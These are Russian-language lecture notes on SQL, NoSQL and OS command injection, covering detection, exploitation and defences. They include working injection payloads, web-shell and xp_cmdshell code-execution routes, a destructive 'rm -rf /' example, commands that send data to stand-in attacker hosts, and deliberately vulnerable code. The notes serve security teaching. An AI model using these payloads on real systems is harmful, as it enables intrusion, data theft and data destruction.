### Серверные уязвимости веб-приложений. Часть 1: SQLi, NoSQLi, OS cmd inj

Серверная уязвимость - цель на сервер
![|649x340](Materials/Pasted%20image%2020250920184935.jpeg)

### SQLi

SQL инъекция - уязвимость, позволяющая вмешиваться злоумышленнику в запросы, которые приложение отправляет к своей базе данных. Это позволяет делать злоумышленнику что угодно с базой данных. 

`https://example.com/get-user?p=1'OR 1=1--` 
->
select * from users
where user=\' ==\' or 1=1--== \';

**~~SQLmap~~**

пример уязвимого кода (Python):
```
import sqlite3
username = input("Enter username")
conn = sqlite3.connect('example.db')
cursor = conn.cursor()
query = f"
	SELECT * 
	FROM users 
	WHERE username = '{username}'
	"
cursor.execute(query)
```

Возможное влияние:
- Чтение чувствительной информации из бд
- Запись информации в бд
- Изменение логики работы программы
- RCE (remote code execution)
- Чтение/запись системных файлов

##### Этапы эксплуатации:
1. Детектирование
2. Определение типа SQLi
3. Получение информации о СУБД и используемом SQL-запросе
4. Попытка исполнения кода/чтения/записи файлов
5. Попытка изменения логики приложения
6. Разведка БД -> получение/запись данных

##### Детектирование черным ящиком:
Ищем потенциальные места инъекций (параметры запроса), затем:
- Добавляем символы \', \'', ) в разных комбинациях и смотрим на ошибки и аномалии
- Вставляем конструкции SQL-синтаксиса и сравниваем с ожидаемым поведением
- **Вставляем логические конструкции OR 1=1 и OR 1=2 (опасно)**
- Используем time-based нагрузки
- Используем out-of-bound нагрузки

Почему опасно использовать нагрузки вида `'OR 1=1--`?
- мы не знаем, куда попадает пейлоад, поэтому она может попасть в небезопасную конструкцию (INSERT/DELETE) и мы снесём бд
- DOS
- Если приложение ожидает 1 строку - получаем False Negative срабатывание (она есть, но мы не нашли)

Вместо этого используем следующие [конструкции](https://tib3rius.com/sqli):
```
MySQL: 'OR IF((NOW() = SYSDATE()) SLEEP(1), 1)='0
PostgreSQL: ' OR (CASE WHEN ((CLOCK_TIMESTAMP() - NOW()) < '0:0:1') THEN (SELECT '1'||PG_SLEEP(1)) ELSE '0' END)='1
MSSQL: -
Oracle: ' OR ROWNUM = '1
SQLite: ' OR ROWID = '1
```

##### Места инъекций в SQL-запросе 

##### Наиболее частые:

SELECT id
FROM users
WHERE username = ‘==admin==’
AND password = ‘==admin==’;

Менее частые:

UPDATE users
SET email = \'==`new.email@example.com\`=='
WHERE id = ==105==;

INSERT INTO orders (customer_id, order_date, amount)
VALUES (
	==(SELECT id FROM customers WHERE email = 'ivan.petrov@mail.ru'),==
	==CURRENT_DATE,==
	==5000==
);

SELECT * FROM employees ORDER BY ==last_name==;

### Разновидности SQLi

##### Error-based SQLi
- приложение возвращает лог ошибок SQL в ответе (StackTrace)
- видимая sqli, мы можем печатать вызовом ошибок
- для эксплуатации нужно заставить приложение вернуть ошибку, содержащую нужные данные

##### Пример Error-based SQLi:

GET /page?id=1==' AND 1=CAST((SELECT name FROM user LIMIT 1) AS int)--== HTTP/1.1
Host: example.com

Ответ сервера:

```
HTTP/1.1 500 Internal Server Error

....
ERROR: invalid input syntax for type integer: "admin"
...
```

##### Boolean-based SQLi
- Оперирование логическими операторами SQL
- Может быть составной частью других типов
- Как самостоятельный тип используется для влияния на логику и обхода авторизации

##### Пример Boolean-based SQLi:

POST /login.php HTTP/1.1
Host: example.com
...
username='==admin''--&password=anything=='

Ответ сервера:

HTTP/1.1 302 Found
Set-Cookie: ...
Location: `https://example.com/profile.php`

##### Union-Based SQLi
- На union конструкциях SQL в нагрузке, чтобы получать данные из других таблиц путем объединения с исходным запросом
- Видимая инъекция
- Возможно, если исходный SQL запрос - SELECT
- Является лучшим способом доставать данные, т.к. данные получаются в чистом виде без сложных конструкций
- Единственная сложность - количество столбцов в UNION запросе должно совпадать с исходным

При эксплуатации:
1. Определяем количество столбцов
	`UNION SELECT NULL`, `UNION SELECT NULL, NULL`, ...
	`ORDER BY 1--`, `ORDER BY 2--`, ...
2. Определить столбец, который возвращается в ответе приложения и определить его тип данных
	`UNION SELECT'asd',NULL--`, `UNION SELECT NULL,'asd'--`
3. Определить, какие таблицы (information_schema.tables) и столбцы (information_schema.columns) есть в бд
4. Достать необходимые значения
5. Бонус- можно использовать конкатенацию и выводить несколько столбцов
	`UNION SELECT NULL, username + || ’~’ || + password FROM users--`

##### Пример Union-Based SQLi

GET /orders?type=1==' UNION SELECT username || '~' || password FROM users--== HTTP/1.1
Host: example.com

Ответ сервера:

```
HTTP/1.1 200 OK
...
{
{"wood", "admin~1234"},
{"wood", "user~4321"},
}
```

##### Time-based SQLi
- происходит вызов временных задержек в зависимости от истинности некоторого условия
- Обычно данные достаются **посимвольно**
- крайне затратный по времени метод. Стоит использовать только если больше ничего не работают
- Бинарный поиск и многопоточность спасают ситуацию
- К данному типу можно свести почти любой другой тип (а в каких случаях нет? - когда данные процедуры работают в многопотоке)

##### Пример Time-based SQLi

GET/page?id=1==';SELECT CASE WHEN (username='admin' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--== HTTP/1.1
Host: example.com

Вызовется 10 секундная задержка в ответе, если условие истинно, иначе временно задержки не будет

##### Blind SQLi
- Приложение не возвращает вывода вне зависимости от поставления данных
- Из поведения приложения можно однозначно сказать, истинно или ложно SQL-условие, которое отправляет атакующий
- Как самостоятельный тип может существовать, если приложение содержит какие-то доп. символы/заголовки
- Очень часто включает в себя другие типы как подвтды, например time-baser, error-based (код ответа)
*Примечание*: при наименовании типа уязвимости, если уязвимость "слепая", то данная характеристика будет доминирующей

##### Пример Blind SQLi

GET /page?id=1==';SELECT CASE WHEN (username='admin' AND==
==SUBSTRING(password,1,1)='a') THEN 1/0 ELSE NULL END FROM users--== HTTP/1.1
Host: example.com

Код ответа 500 (деление на 0), если условие истинно, 200, если ложно

##### Stacked Queries
- Эксплуатация построенна на внедрении второго (произвольного) SQL-запроса после оригинального
- Позволяет встроить запрос другого типа (UPDATE после SELECT)
- Обычно результат второго запроса не будет возвращён
- Часто используется для RCE-векторов
- Можно использовать для Blind SQLi

##### Out-of-bound SQLi
- SQL запрос инициирует обращение по сети к подконтрольному серверу
- Можно использовать как blind-технику или извлекать данные напрямую
- Часто не будет работать в современных приложениях (почему? - потому что все современные приложения контейнезируют или проксируют)
- Если работает, то может спасти, когда time-based и прочие типы не работают

##### Пример Out-of-bound SQLi

GET /page?id=1==';SELECT 1337 INTO OUTFILE ‘\\\\attacker.domain\a’--== HTTP/1.1
Host: example.com
- Получаем отстук на свой домен

##### Second Order SQLi
- Инъекция в SQL запросе происходит не напрямую, а после того, как данные были уже внедрены заранее
- Иными словами, сначала нагрузка сохраняется где-то в БД одним запросом, а затем, последующими запросами вставляется в уязвимый SQL-запрос
- Тип эксплуатации самой нагрузки может быть любой из упомянутых ранее
- Сложнее автоматизировать
- Практически не детектируется сканерами

##### SQLi Cheatsheets
- [portswigger](https://portswigger...)
- [tib3rius](https://tib3rius.com/sqli)
![[Lect4. SQLi. Часть 1-1758574186608.jpeg]]

##### RCE в SQLi

Для каждой субд должны соблюдаться свои условия
- Если язык приложения php/jsp/подобные, то можно записать веб-шелл в файл на системе: 
	`'; SELECT pg_write_file('/var/www/html/shell.php', '<SHELL>', false);--`
- В MSSQL должен присутствовать xp_cmdshell и быть с соответствующими правами (или его альтернативы)
	`EXEC xp_cmdshell 'whoami';`
- СУБД Oracle можно создать и вызвать Java-процедуру
	```java
	CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED "OSCommand" AS
	import java.lang.*;
	import java.io.*;
	
	public class OSCommand {
		public static void executeCommand(String command) throws IOException {
			Runtime.getRuntime().exec(command);
		}
	};
	```
- PostgreeSQL
	- Использовать COPY TO / FROM PROGRAM
		```
		'; DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); 
		COPY cmd_exec FROM PROGRAM 'id'; --
		```
	- User-Defined Functions (UDF) (пишем функцию на С, компилируем и грузим в Postgres)
		```
		CREATE OR REPLACE FUNCTION test(text) RETURNS void AS 'FILENAME', 'test' 
		LANGUAGE 'C' STRICT;
		```
	- Large Objects (принцип похож на предыдущий, но используются структуры больших объектов. Сложность: нужно передавать файл частями и знать/указать идентификатор объекта)
		```
		INSERT INTO PG_LARGEOBJECT (loid, pageno, data) VALUES (%d, %d, decode("%s", <DATA>))
		```

##### Защита
- Санитизация & валидация управляющих символов (слабо)
- Строгое приведение типов (слабо)
- **Prepared Statements**[^1] (однако, может работать не для всех частей запросов, например, названия таблиц, запросов, ORDER BY), [полное объяснение с хабра](https://habr.com/ru/articles/148446/). 
	Пример: `cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))`;
	`session.query(User).filter(User.email == "aa@example.com").first()`
- **ORM** (? сложная штука, пока не понял, что это, максимум - что это посредник между языком и БД, мы не напрямую делаем execute в бд, а через определенный фреймворк) #todo

### NoSQLi

- Уязвимость, с помощью которой злоумышленник может вмешаться в запросы, которые приложение делает к базе данных NoSQL
Пример:
https\://example.com/get-user?username=admin&password==\[$ne\]=invalid==  ->
-> db.users.find({ username: "admin", password: { ==$ne: "invalid"== } })

Как это выглядит в исходном коде (Py):

```
@Query("{ 'username' : ?0, 'password' : ?1 }")
User findByCredentials(String username, String password);

@PostMapping("/login")
public String login(String username, String password) {
	User user = userRepo.findByCredentials(username, password);
	return user != null ? "Logged in" : "Failed";
}
```

##### Возможное влияние
- DoS
- Обход авторизации
- Чтение/изменение файлов
- RCE

##### Отличия от SQLi:
- Используются NoSQL субд
- Нет универсального стандарта - сильно зависит от СУБД и языка приложения
- Существует инъекция операторов (и не только синтаксиса)
- Некоторые NoSQL субд позволяют исполнять JS

##### Разновидности:

###### Syntaxis injection
- Происходит, когда возможно нарушить синтаксик NoSQL-запроса, что позволяет внедрить собственную полезную нагрузку. Методология аналогична используемой при SQL-инъекции. Однако характер атаки существенно различается, поскольку базы данных NoSQL используют различные языки запросов, типы синтаксиса запросов и различные структуры данных.

Обнаружение:
1. Fuzz-payload: 
```
'"`{
;$Foo}
$Foo \xYz
```
2. Инъекция спец. символов и поиск аномалий
3. Проверка условного поведения: 
	1. \' && 0 && \'x 
	2. \' && 1 && \'x
4. Инъекция в логические операторы:
	\'||\'1\'\=\=\'1 (Аналог \'OR 1=1--, **использовать с осторожностью**)
5. Null-символы (\%\%00, \0, \u0000) могут восприниматься как терминаторы строки (комментарии)

Эксплуатация:
1. Посимвольный перебор значения `' && this.password[0] == 'a' || 'a'=='b`
2. Соответствие регулярному выражению `' && this.password.match(/\d/) || 'a'=='b`
3. "Угадывание" названий полей (различия в ответах)
	`' && this.username!='`
	`' && this.foo!='`

Место инъекции:
{"$where":"this.username == '==\<query\>=='"}
	
###### Operator injection
- Происходит, когда возможно использовать операторы запросов NoSQL для манипуляции запросами

Примеры операторов MongoDB:
![[Lect4. SQLi. Часть 1-1758577594337.jpeg|496x272]]

Места для инъекций, детектирование и эксплуатация:
1. GET-запрос:
GET /login?username==\[$ne\]=invalid== HTTP/1.1
Host: example.com
2. POST-запрос:
POST /login HTTP/1.1
Host: example.com
Content-Type: application/json
{"username":=={"\$in":\["admin","administrator","user"\]}==,"password":=={"\$ne":""}==}
3. Boolean-based
{"username":"admin","password":"1234", =="$where":"0"==}
{"username":"admin","password":"1234", =="$where":"1"==}
4. Посимвольное извлечение названия полей (rexeg)
"$where":"Object.keys(this)\[0\].match('^.{0}a.'\)"
5. Посимвольное извлечение значений (regex)
{"username":"admin","password":=={"$regex":"^a*"}==}
6. Time-Based эксплуатация
	1. Вызов задержки
	{"$where": "sleep(5000)"}
	2. Условная задержка
	'+function(x){var waitTill = new Date(new Date().getTime() + 5000);==while((x.password\[0\]\=\=\="a")== && waitTill > new Date()){};}(this)+'
	'+function(x){==if(x.password\[0\]\=\=\="a")=={sleep(5000)};}(this)+'

##### Защита:
- Санитизация & валидация ввода
- Белый список разрешенных символов
- Использование параметризированных запросов
- Белый список разрешенных ключей (от инъекции операторов)
- **Конкретные меры защиты зависят от конкретной NoSQL СУБД**

### OS Command injection

- позволяет злоумышленнику выполнять команды операционной системы (ОС) на сервере, на котором запущено приложение, и, как правило, полностью скомпрометировать приложение и его данные.

Пример:
http\://example.com/ping.php?ip=8.8.8.8==;+rm+-rf+/==
-> 
ping -c 4 8.8.8.8==; rm -rf /==

Как выглядит в исходном коде:
```
import os
user_input = input("Enter a filename: ")
os.system(f"cat {user_input}")
```

Разновидности:
- Видимая
- Невидимся

Символы для внедрения команд:
```
&
&&
|
||
;
0x0a
\n
`INJECTED_COMMAND`
$(INJECTED_COMMAND)
```

##### Видимая OS command injection

- Вывод отображается в возвращаемом ответе
- Простая эксплуатация, но не всегда очевидные места внедрения

Пример:

http\://example.com/order?src\===1==&dst\===3== 
-> 
./vieworder.sh 1 3

http\://example.com/order?src\===& echo pwned &==&dst\===3== 
-> 
./vieworder.sh ==& echo pwned &== ==3==
->
Error - src was not provided
pwned
3: command not found

##### Blind OS command injection
- Вывод не отображается в возвращаемом ответе
- Сложнее детектировать, но также простая эксплуатация

Обнаружение:
1. Вызов временной задержки:
& ping -c 10 127.0.0.1 &
& sleep 10 &
2. Перенаправление вывода:
& whoami > /var/www/static/whoami.txt &
3. Внешняя коммуникация:
& nslookup tst.attacker.com &
& nslookup `whoami`.tst.attacker.com &
& curl tst.attacker.com &

##### Первичная разведка хоста
![[Lect4. SQLi. Часть 1-1758578971032.jpeg]]

**Однако любая из данных команд позволяет обнаружить присутствие атакующего**

##### Защита
- Белый список разрешенных символов
- Валидация, что ввод пользователя является числом
- Валидация что ввод пользователя содержит только буквы и цифры
- **Не позволять пользовательскому вводу достигать мест исполнения команд ОС**

[^1]: ...поскольку данные передаются полностью отдельно от запроса, у этих данных нет никаких возможностей модифицировать запрос. Нет возможностей. _Вообще никаких_. (Экзотические атаки типа переполнения буфера здесь мы не рассматриваем — это совсем другой класс атак). Данные не нужно экранировать, преобразовывать или как-то менять; они идут в базу данных в точно том виде, в каком нужны нам. Если нам передали строку `Robert');drop table students;`, не надо заботиться об экранировании, надо просто передать ее как связываемую переменную — ничего она нам не сделает, а так и будет просто лежать в базе данных, как самая обычная строка.
